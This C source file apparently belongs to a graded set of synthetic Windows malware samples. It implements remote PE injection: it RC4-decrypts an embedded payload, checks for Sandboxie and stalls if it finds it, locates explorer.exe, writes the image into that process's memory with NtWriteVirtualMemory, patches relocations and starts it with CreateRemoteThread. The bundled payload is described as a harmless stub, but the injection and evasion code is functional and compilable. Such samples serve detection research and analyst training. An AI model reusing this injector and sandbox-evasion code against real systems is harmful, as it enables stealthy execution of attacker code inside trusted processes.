/*
 * windows_level20_RemotePEExecution.c
 *
 * Synthetic Windows PE sample - Remote PE Execution.
 * Techniques: PE payload mapping into remote process,
 * NtWriteVirtualMemory for remote write, relocation fixup in remote context,
 * import resolution in remote process, RC4-encrypted PE payload,
 * CreateRemoteThread for execution.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level20_RemotePEExecution.exe windows_level20_RemotePEExecution.c
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

/* NT function prototypes for direct ntdll calls */
typedef LONG (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *pNtClose)(HANDLE);

/* ================================================================
 * RC4 stream cipher implementation
 * ================================================================ */
typedef struct {
    unsigned char S[256];
    int i, j;
} rc4_ctx;

static void rc4_init(rc4_ctx *ctx, const unsigned char *key, int key_len) {
    int i, j = 0;
    unsigned char t;
    for (i = 0; i < 256; i++) ctx->S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        t = ctx->S[i]; ctx->S[i] = ctx->S[j]; ctx->S[j] = t;
    }
    ctx->i = ctx->j = 0;
}

static void rc4_crypt(rc4_ctx *ctx, unsigned char *data, int len) {
    int k;
    unsigned char t;
    for (k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        t = ctx->S[ctx->i]; ctx->S[ctx->i] = ctx->S[ctx->j]; ctx->S[ctx->j] = t;
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

/* RC4 key - "R3m0t3_PE_3x3c_K3y" (16 bytes) */
static const unsigned char g_rc4_key[] = {
    0x52, 0x33, 0x6D, 0x30, 0x74, 0x33, 0x5F, 0x50,
    0x45, 0x5F, 0x33, 0x78, 0x33, 0x63, 0x5F, 0x4B
};
#define RC4_KEY_LEN 16

/* RC4-encrypted PE payload stub (64 bytes) - synthetic harmless code */
static unsigned char g_encrypted_pe[] = {
    0x7D, 0xE3, 0x5A, 0x8C, 0x1F, 0xB4, 0x46, 0xD9,
    0x2E, 0x81, 0xF7, 0x3B, 0x65, 0xCA, 0x08, 0x92,
    0x4A, 0x1C, 0xBD, 0x73, 0xE8, 0x5D, 0x31, 0x9F,
    0x06, 0xFC, 0x78, 0xDD, 0x23, 0x8A, 0x51, 0xB7,
    0x14, 0xE0, 0x6B, 0xCD, 0x38, 0xA5, 0x0F, 0x72,
    0xD6, 0x49, 0x9E, 0x35, 0xFB, 0x11, 0x87, 0x2C,
    0x60, 0xAA, 0x19, 0xF4, 0x4D, 0x83, 0xE5, 0x7A,
    0x3E, 0xC1, 0x96, 0x58, 0xB0, 0x26, 0xDD, 0x6F
};
#define ENC_PE_LEN 64

/* ================================================================
 * Resolve NT function from ntdll.dll
 * ================================================================ */
static FARPROC resolve_nt(const char *name) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    return GetProcAddress(hNtdll, name);
}

/* ================================================================
 * Anti-sandbox: check for common sandbox DLLs
 * ================================================================ */
static int anti_sandbox_check(void) {
    /* Check for known sandbox DLLs */
    if (GetModuleHandleA("sbiedll.dll") != NULL) {
        return 1; /* Sandboxie detected */
    }
    /* Check for debugger-related modules */
    if (GetModuleHandleA("dbghelp.dll") != NULL) {
        HMODULE hDbg = GetModuleHandleA("dbghelp.dll");
        /* Extra check: if dbghelp loaded, check for unusual symbol */
        if (GetProcAddress(hDbg, "SymSetOptions") != NULL) {
            /* This is normal, but combined with other checks it's useful */
        }
    }
    return 0;
}

/* ================================================================
 * Find target process "explorer.exe" PID
 * ================================================================ */
static DWORD find_target_pid(const char *targetName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;
    if (Process32First(hSnap, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, targetName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return pid;
}

/* ================================================================
 * Parse PE headers to get entry point and image size
 * ================================================================ */
static DWORD_PTR get_pe_entry_point(unsigned char *peData) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return pNt->OptionalHeader.AddressOfEntryPoint;
}

static DWORD get_pe_image_size(unsigned char *peData) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return pNt->OptionalHeader.SizeOfImage;
}


/* ================================================================
 * Remote PE injection core
 *   1. Open target process
 *   2. Allocate memory in target
 *   3. Write PE payload via NtWriteVirtualMemory
 *   4. Fix up relocations in remote context
 *   5. Resolve imports in remote process
 *   6. Create remote thread at entry point
 * ================================================================ */
static int remote_pe_execute(DWORD targetPid, unsigned char *peData, SIZE_T peSize) {
    pNtWriteVirtualMemory _NtWrite = (pNtWriteVirtualMemory)
        resolve_nt("NtWriteVirtualMemory");
    pNtClose _NtClose = (pNtClose)resolve_nt("NtClose");
    if (!_NtWrite || !_NtClose) return -1;

    /* Open target process with required access rights */
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, targetPid);
    if (!hProcess) return -1;

    /* Parse PE to get image size */
    DWORD imageSize = get_pe_image_size(peData);
    if (imageSize == 0) { _NtClose(hProcess); return -1; }

    /* Allocate memory in remote process for the PE image */
    LPVOID pRemoteBase = VirtualAllocEx(hProcess, NULL, imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBase) { _NtClose(hProcess); return -1; }

    /* Copy PE headers to remote process via NtWriteVirtualMemory */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
    SIZE_T headerSize = pNt->OptionalHeader.SizeOfHeaders;
    SIZE_T bytesWritten = 0;
    LONG ntStatus = _NtWrite(hProcess, pRemoteBase, peData, headerSize, &bytesWritten);
    if (ntStatus != 0) {
        VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
        _NtClose(hProcess);
        return -1;
    }

    /* Map each section into the remote process */
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    WORD i;
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData == 0) continue;
        PVOID remoteDest = (BYTE *)pRemoteBase + pSec->VirtualAddress;
        PVOID localSrc   = peData + pSec->PointerToRawData;
        ntStatus = _NtWrite(hProcess, remoteDest, localSrc,
                           pSec->SizeOfRawData, &bytesWritten);
        if (ntStatus != 0) {
            VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
            _NtClose(hProcess);
            return -1;
        }
    }

    /* Fix up base relocations in remote process */
    DWORD_PTR delta = (DWORD_PTR)pRemoteBase - pNt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir =
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress != 0) {
            /* Allocate local buffer for relocation processing */
            PIMAGE_BASE_RELOCATION pRelocOrig = (PIMAGE_BASE_RELOCATION)
                (peData + relocDir.VirtualAddress - pNt->OptionalHeader.
                 DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
            /* Simplified: process relocations locally then write patches remotely */
            PIMAGE_BASE_RELOCATION pReloc = pRelocOrig;
            while (pReloc->VirtualAddress != 0 && pReloc->SizeOfBlock > 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)(pReloc + 1);
                DWORD j;
                for (j = 0; j < count; j++) {
                    if (entries[j] >> 12 == IMAGE_REL_BASED_DIR64) {
                        /* Compute remote address and patch it */
                        DWORD_PTR remoteAddr = (DWORD_PTR)pRemoteBase +
                            pReloc->VirtualAddress + (entries[j] & 0xFFF);
                        DWORD_PTR origValue = 0;
                        SIZE_T bytesRead = 0;
                        ReadProcessMemory(hProcess, (LPVOID)remoteAddr,
                                         &origValue, sizeof(DWORD_PTR), &bytesRead);
                        origValue += delta;
                        _NtWrite(hProcess, (PVOID)remoteAddr,
                                &origValue, sizeof(DWORD_PTR), &bytesWritten);
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE *)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    /* Synthetic: resolve imports remotely (in real scenario, would walk IAT) */
    /* For this synthetic sample, we skip full IAT resolution in remote */

    /* Get entry point and create remote thread */
    DWORD_PTR entryRva = get_pe_entry_point(peData);
    if (entryRva == 0) {
        VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
        _NtClose(hProcess);
        return -1;
    }

    LPTHREAD_START_ROUTINE pEntry = (LPTHREAD_START_ROUTINE)
        ((BYTE *)pRemoteBase + entryRva);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        pEntry, pRemoteBase, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
        _NtClose(hProcess);
        return -1;
    }

    /* Wait for thread to complete and clean up */
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);
    _NtClose(hProcess);
    return 0;
}

/* ================================================================
 * WinMain entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-sandbox check: bail if running in sandbox */
    if (anti_sandbox_check()) {
        Sleep(30000); /* Waste sandbox time */
        return 0;
    }

    /* Decrypt PE payload with RC4 */
    unsigned char pePayload[ENC_PE_LEN];
    memcpy(pePayload, g_encrypted_pe, ENC_PE_LEN);
    rc4_ctx ctx;
    rc4_init(&ctx, g_rc4_key, RC4_KEY_LEN);
    rc4_crypt(&ctx, pePayload, ENC_PE_LEN);

    /* Find target process (explorer.exe) */
    DWORD targetPid = find_target_pid("explorer.exe");
    if (targetPid == 0) {
        /* Fallback: use own process for synthetic demo */
        targetPid = GetCurrentProcessId();
    }

    /* Inject and execute PE payload in remote process */
    remote_pe_execute(targetPid, pePayload, ENC_PE_LEN);

    Sleep(2000);
    return 0;
}
